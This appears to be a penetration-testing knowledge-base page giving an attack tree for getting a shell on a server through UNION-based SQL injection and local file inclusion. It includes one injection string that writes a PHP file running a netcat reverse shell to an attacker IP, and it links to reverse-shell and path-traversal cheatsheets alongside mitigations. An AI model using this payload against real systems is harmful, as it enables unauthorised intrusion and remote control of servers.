# Get shell and control target server

## Attack tree

```text
1 Netcat installed on both systems (hacking and target machines) (AND)
    1.1 Install netcat on both systems (AND)
    1.2 Create a reverse shell (AND)
    1.3 Setup a netcat listener on the hacking machine
2 SQL injection writing payload to server (AND)
    2.1 Find out if the database is vulnerable (AND)
        1.1.1 Inject data in the query without breaking it
    2.2 Find the amount of columns (AND)
    2.3 Find which columns accept queries (AND)
    2.4 Build an UNION SELECT SQL segment (AND)
    2.5 Inject SQL statements into the column (AND)
    2.6 Post exploitation
3 Use file inclusion vulnerability of any website on the server to run the payload
    3.1 Connect to the listener from the target machine (AND)
    3.2 Post exploitation
```
## Example SQL segments

PHP (and nc):
```text
-1' UNION SELECT '<?passthru("nc -e /bin/sh/ <IP hacking server> <port>");?>',null into outfile '/tmp/reverse.php' /*
```

## Notes

Works only in combination with a [local file inclusion vulnerability](../application/Local-file-inclusion.md).

## Tools
* [Burp suite CE proxy](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)

## Cheatsheets
* [Weevely cheatsheet](cheatsheets:docs/application/weevely)
* [MSFvenom cheatsheet](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)
* [Detect number of columns](cheatsheets:docs/databases/number-of-columns)
* [Union SQLi queries](cheatsheets:docs/databases/union-select)
* [Local file inclusion](cheatsheets:docs/application/lfi)
* [Reverse shell commands](cheatsheets:docs/application/reverse-shell-commands)
* [Path Traversal Cheat Sheet: Windows](https://www.akimbocore.com/article/windows-path-traversal-cheat-sheet/)
* [Path Traversal Cheat Sheet: Linux](https://www.akimbocore.com/article/linux-path-traversal-cheat-sheet/)

## Mitigations
* [Parameterised statements](app-mitigations:docs/databases/parameterised)
* [Input validation](app-mitigations:docs/databases/Input-validation)
* [Local file inclusion](app-mitigations:docs/coding/Local-file-inclusion)
